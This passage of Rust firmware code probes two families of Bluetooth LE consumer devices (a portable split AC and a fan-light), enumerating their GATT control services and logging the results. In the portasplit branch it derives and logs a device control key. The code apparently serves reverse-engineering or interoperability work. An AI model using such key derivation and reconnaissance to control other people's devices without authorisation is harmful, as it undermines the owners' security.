    let Some(mut conn) = connect_and_mtu(rng, e, SURVEY_ROUNDS * 2).await else {
        set_phase(Phase::Idle);
        return (
            ProbeState::ProbeFailed,
            DeviceKind::PortaSplit,
            HandshakeState::NoHandshake,
        );
    };
    if conn.ev_addr == 0 {
        ulogf!("rprobe: link yielded nothing (ev_addr=0) — no data, stays a candidate\r\n");
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (
            ProbeState::ProbeFailed,
            DeviceKind::PortaSplit,
            HandshakeState::NoHandshake,
        );
    }

    let f = resolve_profile(
        &mut conn,
        device::portasplit::SERVICE_UUID,
        device::portasplit::WRITE_UUID,
        None,
    )
    .await;
    match f {
        SvFind::Found(prof) => {
            ulogf!(
                "  portasplit: FF02/FF01 present (write={:04X})\r\n",
                prof.write_h
            );
            if let Some(mat) = e.ps {
                let key = device::portasplit::derive_key(&mat);
                ulogf!("  portasplit: control key = ");
                decoder::hexdump(&key, 0, 0);
            }
        }
        SvFind::Absent => ulogf!("  portasplit: FF02 absent (err 0x0A)\r\n"),
        SvFind::Gated(code) => ulogf!(
            "  portasplit: FF02 gated (err 0x{:02X} {}) — device not serving ATT\r\n",
            code,
            crate::central::att_error_name(code)
        ),
        SvFind::NoChars => ulogf!("  portasplit: FF02 present but no 0xFF01 write char\r\n"),
        SvFind::Unknown => ulogf!("  portasplit: FF02 resolve inconclusive (link lost)\r\n"),
    }

    ulogf!(
        "rprobe: portasplit done in {}ms\r\n",
        (Instant::now() - t0).as_millis()
    );
    set_phase(Phase::Idle);
    close(&mut conn).await;
    // Same cooldown policy as the midea FFA0 resolve: a definite absence / gated
    // / no-chars is a stable dead-end (long cooldown); a lost link is
    // inconclusive (short cooldown, retried).
    let (probe_state, hs_state) = match f {
        SvFind::Found(_) => (ProbeState::Probed, HandshakeState::NoHandshake),
        SvFind::Absent | SvFind::Gated(_) | SvFind::NoChars => {
            (ProbeState::Probed, HandshakeState::NoControl)
        }
        SvFind::Unknown => (ProbeState::ProbeFailed, HandshakeState::NoHandshake),
    };
    (probe_state, DeviceKind::PortaSplit, hs_state)
}

/// Probe a fan-and-light candidate: another separate family from Midea with a
/// `0xAAAA` GATT service (`0xBBB0` control write, `0xBBB1` state notify) and a
/// MAC-derived XOR base. The device broadcasts its state in the `0x06A8` advert
/// (decoded here from the scan-time snapshot), and the probe resolves `0xAAAA`
/// by targeted discovery — the ATT error is the existence signal. Recon stays
/// passive: no control writes.
async fn probe_fanlight(
    rng: &mut Rng,
    e: &DeviceEntry,
) -> (ProbeState, DeviceKind, HandshakeState) {
    let t0 = Instant::now();
    // The scan-time advert snapshot already carries the device's state.
    if let Some(st) = e.fl {
        let s = device::fanlight::State {
            mode: st[0],
            brightness: st[1],
            color: st[2],
            timer_minutes: u16::from_le_bytes([st[3], st[4]]),
            speed: st[5],
        };
        ulogf!(
            "  fanlight: advert state {}\r\n",
            device::fanlight::fmt_state(&s)
        );
    }
    set_phase(Phase::Enumerate);
    let Some(mut conn) = connect_and_mtu(rng, e, SURVEY_ROUNDS * 2).await else {
        set_phase(Phase::Idle);
        return (
            ProbeState::ProbeFailed,
            DeviceKind::FanLight,
            HandshakeState::NoHandshake,
        );
    };
    if conn.ev_addr == 0 {
        ulogf!("rprobe: link yielded nothing (ev_addr=0) — no data, stays a candidate\r\n");
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (
            ProbeState::ProbeFailed,
            DeviceKind::FanLight,
            HandshakeState::NoHandshake,
        );
    }

    let f = resolve_profile(
        &mut conn,
        device::fanlight::SERVICE_UUID,
        device::fanlight::CONTROL_UUID,
        Some(device::fanlight::STATE_UUID),
    )
    .await;
    match f {
        SvFind::Found(prof) => ulogf!(
            "  fanlight: AAAA present (ctrl={:04X} state={:04X})\r\n",
            prof.write_h,
            prof.notify_h
        ),
        SvFind::Absent => ulogf!("  fanlight: AAAA absent (err 0x0A)\r\n"),
        SvFind::Gated(code) => ulogf!(
            "  fanlight: AAAA gated (err 0x{:02X} {}) — device not serving ATT\r\n",
            code,
            crate::central::att_error_name(code)
        ),
        SvFind::NoChars => ulogf!("  fanlight: AAAA present but no BBB0/BBB1 pair\r\n"),
        SvFind::Unknown => ulogf!("  fanlight: AAAA resolve inconclusive (link lost)\r\n"),
    }

    ulogf!(
        "rprobe: fanlight done in {}ms\r\n",
        (Instant::now() - t0).as_millis()
    );
    set_phase(Phase::Idle);
    close(&mut conn).await;
    // Same cooldown policy as the midea FFA0 resolve: a definite absence / gated
    // / no-chars is a stable dead-end (long cooldown); a lost link is
    // inconclusive (short cooldown, retried).
    let (probe_state, hs_state) = match f {
        SvFind::Found(_) => (ProbeState::Probed, HandshakeState::NoHandshake),
        SvFind::Absent | SvFind::Gated(_) | SvFind::NoChars => {
            (ProbeState::Probed, HandshakeState::NoControl)
        }
        SvFind::Unknown => (ProbeState::ProbeFailed, HandshakeState::NoHandshake),
    };
    (probe_state, DeviceKind::FanLight, hs_state)
}
